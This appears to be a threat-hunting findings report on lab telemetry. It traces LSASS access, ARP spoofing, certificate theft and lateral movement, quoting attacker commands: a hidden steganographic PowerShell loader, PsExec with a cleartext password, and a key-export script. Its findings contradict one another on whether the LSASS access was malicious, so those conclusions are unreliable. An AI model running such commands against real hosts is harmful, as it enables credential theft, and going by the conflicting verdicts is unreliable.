| 1 | 2020-05-02 03:05:16.000Z | scranton.dmevals.local | windows.security | win.AccessMask | 0x1fffff | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaDOKB- | q-0238cf449b | ok |
| 2 | 2020-05-02 03:09:29.000Z | nashua.dmevals.local | windows.security | win.AccessMask | 0x1f3fff | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ8FLV1 | q-73d28d049e | ok |
| 3 | 2020-05-02 03:05:16.000Z | scranton.dmevals.local | windows.security | win.ObjectName | \Device\HarddiskVolume2\Windows\System32\lsass.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaDOKB- | q-0238cf449b | ok |

### F37 · malicious / high · T1556 · LSASS memory accessed with full access rights by PowerShell on scranton (credential theft, not authentication-process modification)

Evidence status: **verified**

On scranton.dmevals.local at 2020-05-02T03:05:16, PowerShell.exe (PID 2976, launched from control.exe with -noni -noexit -ep bypass -window hidden and a bitmap-steganography IEX payload) opened lsass.exe (PID 736) with GrantedAccess 0x1fffff and 0x1f3fff — PROCESS_ALL_ACCESS, the classic credential-dumping access mask. This is credential theft from the authentication process rather than modification of it: no registry writes to LSA/Notification Packages/NetworkProvider, no password-filter DLL, no reversible-encryption or MFA changes were observed. The stolen credentials were then used in cleartext by PsExec64 to reach NASHUA.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-83cf5da312 | ok |
| 2 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\WindowsPowerShell\v1.0\PowerShell.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-83cf5da312 | ok |
| 3 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gj | q-83cf5da312 | ok |
| 4 | 2020-05-02 02:58:44.325Z | scranton.dmevals.local | windows.sysmon | process.command_line | "PowerShell.exe" -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbee… | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItQB61zZ | q-c14ea226af | ok |
| 5 | 2020-05-02 03:14:42.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | .\PsExec64.exe -accepteula \\NASHUA -u "dmevals\pbeesly" -p "Fl0nk3rt0n!T0by" -i 2 "C:\Windows\Temp\python.exe" | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZLhZrj | q-5de901c8b0 | ok |

### F47 · malicious / high · T1557 · Adversary-in-the-Middle positioning via ARP poisoning on the 10.0.1.0/24 segment

Evidence status: **verified**

The overarching AiTM activity is the MAC takeover of 10.0.1.4 by fc:bd:67:e1:a9:c1 from 00:33:26, redirecting 10.0.1.4<->10.0.1.6 (NASHUA) SMB/WinRM/RPC/HTTP flows through the attacker. The legitimate MAC 00:0d:3a:4d:42:f2 continues to be seen for the same IP, confirming two devices claiming one address. This is the on-path positioning that enables the credential access observed in the Kerberos cifs/NASHUA and HTTP/NASHUA ticket requests.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-04-30 00:33:26.283Z | bobs.bigwheel.local | zeek | zeek.orig_l2_addr | fc:bd:67:e1:a9:c1 | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNn1uOFchItY1uwPj | q-bbaeea90e1 | ok |
| 2 | 2020-04-30 00:33:26.283Z | bobs.bigwheel.local | zeek | zeek.resp_l2_addr | 00:0d:3a:13:e3:69 | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNn1uOFchItY1uwPj | q-bbaeea90e1 | ok |
| 3 | 2020-04-30 00:33:26.292Z | simplerockbuild.simplerock.lan | zeek | zeek.client | pbeesly/DMEVALS.LOCAL | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrIjn | q-cac21f1df8 | ok |

### F44 · malicious / high · T1557.002 · ARP cache poisoning: MAC fc:bd:67:e1:a9:c1 impersonates IP 10.0.1.4 to intercept traffic to NASHUA (10.0.1.6)

Evidence status: **verified**

In the Zeek capture (2020-04-30 00:06-00:45) host IP 10.0.1.4 is seen with two different source MAC addresses. The legitimate MAC 00:0d:3a:4d:42:f2 is present across the whole window (134 connections, 00:06:38-00:45:00), while a second MAC fc:bd:67:e1:a9:c1 appears only from 00:33:26 onward (44 connections) and exclusively targets 10.0.1.6 (NASHUA) on SMB/445, WinRM/5985, RPC/135 and HTTP/80. A single IP being claimed by a new MAC mid-capture is the signature of ARP cache poisoning / MAC takeover, positioning the attacker in the middle of 10.0.1.4<->10.0.1.6 traffic. Kerberos TGS requests for pbeesly/DMEVALS.LOCAL to cifs/NASHUA and HTTP/NASHUA follow immediately, consistent with credential use against the victim.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-04-30 00:33:26.283Z | bobs.bigwheel.local | zeek | zeek.orig_l2_addr | fc:bd:67:e1:a9:c1 | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNn1uOFchItY1uwPj | q-bbaeea90e1 | ok |
| 2 | 2020-04-30 00:33:26.283Z | bobs.bigwheel.local | zeek | source.ip | 10.0.1.4 | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNn1uOFchItY1uwPj | q-bbaeea90e1 | ok |
| 3 | 2020-04-30 00:33:26.283Z | bobs.bigwheel.local | zeek | destination.ip | 10.0.1.6 | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNn1uOFchItY1uwPj | q-bbaeea90e1 | ok |
| 4 | 2020-04-30 00:33:26.283Z | bobs.bigwheel.local | zeek | destination.port | 5985 | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNn1uOFchItY1uwPj | q-bbaeea90e1 | ok |
| 5 | 2020-04-30 00:33:26.292Z | simplerockbuild.simplerock.lan | zeek | zeek.service | HTTP/NASHUA | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrIjn | q-cac21f1df8 | ok |
| 6 | 2020-04-30 00:33:26.292Z | simplerockbuild.simplerock.lan | zeek | zeek.client | pbeesly/DMEVALS.LOCAL | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrIjn | q-cac21f1df8 | ok |

### F48 · malicious / high · T1558 · PowerShell opens LSASS with PROCESS_ALL_ACCESS (0x1fffff) on scranton — credential/ticket theft staging

Evidence status: **verified**

On scranton.dmevals.local, PowerShell.exe (PID 2976) opened lsass.exe (PID 736) with GrantedAccess 0x1fffff (PROCESS_ALL_ACCESS) at 2020-05-02T03:05:16.654Z, with a CallTrace ending in an UNKNOWN module (UNKNOWN(000001996D28200D)) — the classic signature of in-memory credential/ticket extraction. This is the only non-system process among the LSASS handle-grant events with full access; the other 0x1fffff grants come from legitimate system processes (wininit.exe, csrss.exe). Minutes later, at 2020-05-02T03:21:29Z on the same host, a PowerShell script block (ScriptBlockId bc19aae2-d1f9-49b2-b718-192531ae928f, user pbeesly) executed a reflective shellcode loader using GetProcAddress/GetModuleHandle via Microsoft.Win32.UnsafeNativeMethods and a base64-encoded PE payload. Together these indicate an adversary on scranton stealing credentials/tickets from LSASS memory.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-4a6631429e | ok |
| 2 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\WindowsPowerShell\v1.0\PowerShell.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-4a6631429e | ok |
| 3 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.TargetImage | C:\windows\system32\lsass.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-4a6631429e | ok |
| 4 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.CallTrace | C:\windows\SYSTEM32\ntdll.dll+9c584\|C:\windows\System32\KERNELBASE.dll+2732e\|UNKNOWN(000001996D28200D) | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-4a6631429e | ok |
| 5 | 2020-05-02 03:21:29.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function jzI {  	Param ($yKR, $cq)		  	$vvA = ([AppDomain]::CurrentDomain.GetAssemblies() \| Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZRkUVV | q-f13e7af430 | ok |
| 6 | 2020-05-02 03:21:29.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockId | bc19aae2-d1f9-49b2-b718-192531ae928f | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZRkUVV | q-f13e7af430 | ok |

### F57 · malicious / high · T1649 · PowerShell Get-PrivateKeys exports all LocalMachine certificates with private keys to .pfx on scranton

Evidence status: **verified**

On scranton.dmevals.local, user pbeesly, a PowerShell process (PID 3876, ProcessGuid {47ab858c-e23d-5eac-c603-000000000400}) executed a script block named Get-PrivateKeys (loaded from C:\Program Files\SysinternalsSuite\readme.ps1) that enumerates cert:\LocalMachine recursively and calls Export-PfxCertificate for every certificate with a thumbprint, writing each certificate AND its private key to a randomly-named .pfx in $env:USERPROFILE\Downloads protected by the hardcoded password 'saribas'. The same process then created C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx and wrote certificate Blob values under HKLM\SOFTWARE\Microsoft\SystemCertificates\MY\Certificates\48B5E43D09D080DF8863152FD22ED7C43443D499 and ...\Remote Desktop\Certificates\615B93C2D2B647D1670500B3338EAAEC83BA5646. This is direct theft of authentication certificates/private keys (T1649). The parent process was a hidden, execution-policy-bypass PowerShell that decoded a bitmap-encoded payload (monkey.png) via IEX, indicating a compromised host.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Get-PrivateKeys {     $mypwd = ConvertTo-SecureString -String "saribas" -Force -AsPlainText     $CertPaths = Get-ChildItem -Path cert:\LocalMachine -Re… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZSl2ML | q-ba06198810 | ok |
| 2 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Get-PrivateKeys {     $mypwd = ConvertTo-SecureString -String "saribas" -Force -AsPlainText     $CertPaths = Get-ChildItem -Path cert:\LocalMachine -Re… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZSl2ML | q-ba06198810 | ok |
| 3 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.Path | C:\Program Files\SysinternalsSuite\readme.ps1 | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZSl2ML | q-ba06198810 | ok |
| 4 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | process.command_line | Get-PrivateKeys | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZRlVDe | q-ce55e1a396 | ok |
| 5 | 2020-05-02 03:04:57.460Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTkbEF9 | q-40ad9db7fc | ok |
| 6 | 2020-05-02 03:04:57.428Z | scranton.dmevals.local | windows.sysmon | win.TargetObject | HKLM\SOFTWARE\Microsoft\SystemCertificates\MY\Certificates\48B5E43D09D080DF8863152FD22ED7C43443D499\Blob | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTkbEGc | q-b6694e0fb9 | ok |
| 7 | 2020-05-02 03:00:13.551Z | scranton.dmevals.local | windows.sysmon | process.parent.command_line | "PowerShell.exe" -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbee… | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTvoSAW | q-b6cece78b4 | ok |

### F20 · suspicious / medium · T1187 · Outbound SMB/WebDAV to 192.168.0.4 and SMB to 10.0.1.6 from scranton (10.0.1.4)

Evidence status: **verified**

Zeek conn records show host 10.0.1.4 (scranton) making repeated outbound SMB connections to 192.168.0.4 on ports 445 and 139 that were rejected (conn_state REJ, 0 bytes) immediately before the WebDAV HTTP traffic to the same 192.168.0.4 at 00:32:14-00:32:18, indicating the host was probing/being directed to an external SMB/WebDAV listener. The same host also performed large SMB transfers to 10.0.1.6 (up to 4,261,160 bytes) and SMB share access to \\NEWYORK.dmevals.local\sysvol and IPC$ (10.0.0.4). The 192.168.0.4 SMB/WebDAV combination is consistent with forced-authentication infrastructure, though the SMB-to-10.0.1.6 and sysvol access are more typical of normal domain activity.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-04-30 00:32:14.891Z | simplerockbuild.simplerock.lan | zeek | destination.ip | 192.168.0.4 | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrYih | q-6a4a855133 | ok |
| 2 | 2020-04-30 00:32:14.891Z | simplerockbuild.simplerock.lan | zeek | zeek.conn_state | REJ | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrYih | q-6a4a855133 | ok |
| 3 | 2020-04-30 00:35:25.619Z | simplerockbuild.simplerock.lan | zeek | network.bytes | 4261160 | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrogj | q-6a4a855133 | ok |
| 4 | 2020-04-30 00:12:01.658Z | simplerockbuild.simplerock.lan | zeek | zeek.path | \\NEWYORK.dmevals.local\sysvol | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrYir | q-24ebc37987 | ok |

### F29 · suspicious / medium · T1552.001 · accesschk.exe creates a 'passwordsDB' file on scranton host

Evidence status: **verified**

On scranton.dmevals.local at 2020-05-02T03:04:35Z, Sysinternals accesschk.exe (PID 9204, running as SYSTEM) created the file C:\Program Files\SysinternalsSuite\passwordsDB (Sysmon event 11). A PowerShell 4104 block at 03:04:34Z shows pbeesly invoking '& "C:\Program Files\SysinternalsSuite\accesschk.exe"', immediately preceding the file creation. The filename 'passwordsDB' strongly suggests a credential-harvesting artifact written to disk, though the file content itself was not captured in the telemetry. This is consistent with collecting credentials into a file (T1552.001).

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:35.069Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\Program Files\SysinternalsSuite\passwordsDB | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTkbkGF | q-1ef32ac9a5 | ok |
| 2 | 2020-05-02 03:04:35.069Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\Program Files\SysinternalsSuite\accesschk.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTkbkGF | q-0fdfa1e5c0 | ok |
| 3 | 2020-05-02 03:04:34.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | &amp; "C:\Program Files\SysinternalsSuite\accesschk.exe" | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZSl2MI | q-13d1184e9e | ok |

### F64 · suspicious / medium · T1552.001 · PowerShell compiles in-memory C# credential tooling via csc.exe on scranton

Evidence status: **verified**

On scranton.dmevals.local, powershell.exe invoked csc.exe twice (02:58:45 and 03:08:03) to compile C# source into DLLs in random-named temp folders (qkbkqqbs.dll, 0piklvia.dll). This Add-Type style compilation is consistent with loading credential-access tooling in memory; the surrounding activity (accesschk passwordsDB, .pfx export, LSASS access) supports a credential-theft context.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:58:45.297Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\pbeesly\AppData\Local\Temp\qkbkqqbs\qkbkqqbs.cmdline" | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItQA6YzM | q-1e62d815af | ok |
| 2 | 2020-05-02 02:58:45.292Z | scranton.dmevals.local | windows.sysmon | file.path | C:\Users\pbeesly\AppData\Local\Temp\qkbkqqbs\qkbkqqbs.dll | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItQA6Yzb | q-edbeaec04f | ok |

### F66 · suspicious / low · T1552.001 · hostui.exe spawned by PowerShell on scranton

Evidence status: **verified**

On scranton.dmevals.local, C:\Windows\System32\hostui.exe was spawned by powershell.exe under user pbeesly at 03:21:27. hostui.exe is a known UAC-bypass/credential-prompt abuse binary; an unusual parent (PowerShell) in this credential-theft context makes it suspicious.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:21:27.276Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\Windows\System32\hostui.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItKT-VVW | q-b3af6ab0f2 | ok |
| 2 | 2020-05-02 03:21:27.276Z | scranton.dmevals.local | windows.sysmon | process.parent.executable | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItKT-VVW | q-b3af6ab0f2 | ok |

### F67 · suspicious / low · T1552.001 · sdclt.exe spawned by cmd on scranton

Evidence status: **verified**

On scranton.dmevals.local, C:\Windows\System32\sdclt.exe was spawned by cmd.exe under user pbeesly at 02:58:42 (3 times). sdclt.exe is a known UAC-bypass binary; its invocation from cmd in this credential-theft context is suspicious.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:58:42.401Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\Windows\System32\sdclt.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItQB7l0w | q-b3af6ab0f2 | ok |
| 2 | 2020-05-02 02:58:42.401Z | scranton.dmevals.local | windows.sysmon | process.parent.executable | C:\Windows\System32\cmd.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItQB7l0w | q-b3af6ab0f2 | ok |

### F45 · suspicious / medium · T1557.001 · SMB/WinRM/RPC traffic from spoofed 10.0.1.4 to NASHUA with Kerberos cifs/NASHUA tickets (possible SMB relay)

Evidence status: **verified**

The spoofing MAC fc:bd:67:e1:a9:c1 drives SMB (445), WinRM (5985), RPC (135) and HTTP (80) connections from 10.0.1.4 to 10.0.1.6 (NASHUA). Kerberos TGS requests for pbeesly/DMEVALS.LOCAL to cifs/NASHUA and HTTP/NASHUA are observed at 00:33:26 and 00:35:25, i.e. immediately after the MAC takeover begins. This is consistent with name-resolution/SMB-relay style credential capture, though no explicit relay tooling or LLMNR/NBT-NS poisoning was observed in the PowerShell or DNS data.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-04-30 00:33:26.283Z | bobs.bigwheel.local | zeek | destination.port | 5985 | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNn1uOFchItY1uwPj | q-bbaeea90e1 | ok |
| 2 | 2020-04-30 00:33:26.292Z | simplerockbuild.simplerock.lan | zeek | zeek.service | HTTP/NASHUA | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrIjn | q-cac21f1df8 | ok |
| 3 | 2020-04-30 00:33:26.292Z | simplerockbuild.simplerock.lan | zeek | zeek.request_type | TGS | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrIjn | q-cac21f1df8 | ok |

### F04 · benign / high · T1003 · No credential-dumping tooling observed across process creations, script blocks or file writes

Evidence status: **verified**

Stacking all 447 sysmon process creations and 460 security 4688 process creations shows only standard Windows/Azure tooling (svchost, conhost, powershell, cmd, rundll32, PsExec64/PSEXESVC, sdelete64, Azure agents). No mimikatz, procdump, comsvcs.dll MiniDump, reg save, ntdsutil, vssadmin, diskshadow or drsuapi command lines exist in any dataset, and no PowerShell 4104 script block references lsass/mimikatz/sekurlsa/MiniDump/DCSync/ntds. The only .dmp files are WerFault.exe WER crash dumps. No evidence of OS credential dumping was found.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:19:09.809Z | scranton.dmevals.local | windows.sysmon | process.command_line | C:\windows\system32\lsass.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItO9re0C | q-383d9fc8c6 | ok |
| 2 | 2020-05-02 03:05:30.288Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\ProgramData\Microsoft\Windows\WER\Temp\WER5437.tmp.dmp | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItThYN7M | q-dfe4fc46eb | ok |

### F01 · benign / high · T1003.001 · LSASS handle opens with full access masks by PowerShell/wsmprovhost are .NET process-management calls, not memory dumping

Evidence status: **verified**

On scranton.dmevals.local, PowerShell.exe (PID 2976) opened lsass.exe (PID 736) with GrantedAccess 0x1FFFFF at 03:05:16, and PowerShell.exe (PID 3876) opened lsass.exe with 0x1000 at 03:01:03; on nashua.dmevals.local wsmprovhost.exe (PID 7720) opened lsass.exe (PID 728) with 0x1F3FFF at 03:09:29. The CallTrace for each shows managed .NET frames (System.ni.dll, Microsoft.PowerShell.Commands.Management.ni.dll), i.e. PowerShell's process-management cmdlets querying process information, not a memory read/dump. No dump file was written (the only .dmp files are WerFault.exe WER crash dumps), and no process command line anywhere references lsass, comsvcs, MiniDump, procdump or mimikatz. The 0x1FFFFF opens by wininit.exe/csrss.exe at 03:19:09 coincide with a normal lsass process restart (PID 748, parent wininit.exe).

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-8675118ea5 | ok |
| 2 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\WindowsPowerShell\v1.0\PowerShell.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-8675118ea5 | ok |
| 3 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\wsmprovhost.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItUHCTY0 | q-2f5e479de8 | ok |
| 4 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItUHCTY0 | q-2f5e479de8 | ok |
| 5 | 2020-05-02 03:01:03.622Z | scranton.dmevals.local | windows.sysmon | win.CallTrace | C:\windows\SYSTEM32\ntdll.dll+9c584\|C:\windows\System32\KERNELBASE.dll+2732e\|C:\windows\assembly\NativeImages_v4.0.30319_64\System\9803982d7bc887e2745bff18a43… | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTtmJQ5 | q-a9a5705db3 | ok |
| 6 | 2020-05-02 03:19:09.809Z | scranton.dmevals.local | windows.sysmon | win.ParentImage | C:\Windows\System32\wininit.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItO9re0C | q-383d9fc8c6 | ok |
| 7 | 2020-05-02 03:05:27.395Z | nashua.dmevals.local | windows.sysmon | win.TargetFilename | C:\ProgramData\Microsoft\Windows\WER\Temp\WER51F5.tmp.dmp | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTiZblD | q-dfe4fc46eb | ok |

### F02 · benign / high · T1003.002 · SAM hive registry writes and SAM_DOMAIN/SAM_SERVER handle opens performed by lsass.exe (machine account) - normal OS activity

Evidence status: **verified**

On scranton.dmevals.local, lsass.exe (PID 748, running as SCRANTON$) wrote HKLM\SAM\SAM\Domains\Account\F at 03:19:10 and opened SAM_SERVER/SAM_DOMAIN/SAM_ALIAS objects (AccessMask 0xf003f/0xf07df/0xf) at 03:19:11-03:20:46. These are the OS's own SAM operations by the Local Security Authority, not an external tool copying hives. No 'reg save', no SAM/SECURITY/SYSTEM hive file copies were created (the only file-create hits matching SAM/SECURITY/SYSTEM were Prefetch .pf files), and no process command line references reg save or SAM.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:19:10.368Z | scranton.dmevals.local | windows.sysmon | win.TargetObject | HKLM\SAM\SAM\Domains\Account\F | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItO9rO3D | q-1e9a29a581 | ok |
| 2 | 2020-05-02 03:19:10.368Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\windows\system32\lsass.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItO9rO3D | q-1e9a29a581 | ok |
| 3 | 2020-05-02 03:20:46.000Z | scranton.dmevals.local | windows.security | win.ObjectType | SAM_SERVER | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItVn0lP6 | q-63b2d9c8a6 | ok |
| 4 | 2020-05-02 03:20:46.000Z | scranton.dmevals.local | windows.security | win.ProcessName | C:\Windows\System32\lsass.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItVn0lP6 | q-63b2d9c8a6 | ok |
| 5 | 2020-05-02 03:20:46.000Z | scranton.dmevals.local | windows.security | win.ObjectType | SAM_DOMAIN | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItVn0lPQ | q-63b2d9c8a6 | ok |
| 6 | 2020-05-02 03:21:28.476Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\Windows\Prefetch\SECURITYHEALTHSYSTRAY.EXE-41AD6DE1.pf | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItKT-FUX | q-85401320d7 | ok |

### F03 · benign / high · T1003.005 · HKLM\SECURITY\Cache\NL$1 writes by lsass.exe are normal cached-credential maintenance

Evidence status: **verified**

On nashua.dmevals.local lsass.exe (PID 728) set HKLM\SECURITY\Cache\NL$1 four times between 03:11:40 and 03:15:03, and on scranton.dmevals.local lsass.exe set the same value at 03:20:46. These writes are performed by the Local Security Authority process itself as part of normal cached-domain-credential maintenance, not extraction of the cache. No process command line or PowerShell script block references cache, mscache or DCC2, and no tool read the SECURITY hive.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:11:40.144Z | nashua.dmevals.local | windows.sysmon | win.TargetObject | HKLM\SECURITY\Cache\NL$1 | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTVGQnT | q-fd5b2915e6 | ok |
| 2 | 2020-05-02 03:11:40.144Z | nashua.dmevals.local | windows.sysmon | process.executable | C:\windows\system32\lsass.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTVGQnT | q-fd5b2915e6 | ok |
| 3 | 2020-05-02 03:20:46.691Z | scranton.dmevals.local | windows.sysmon | win.TargetObject | HKLM\SECURITY\Cache\NL$1 | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItOpVKlK | q-fd5b2915e6 | ok |

### F05 · benign / high · T1040 · Azure Network Watcher agent performs a legitimate netsh packet capture on scranton

Evidence status: **verified**

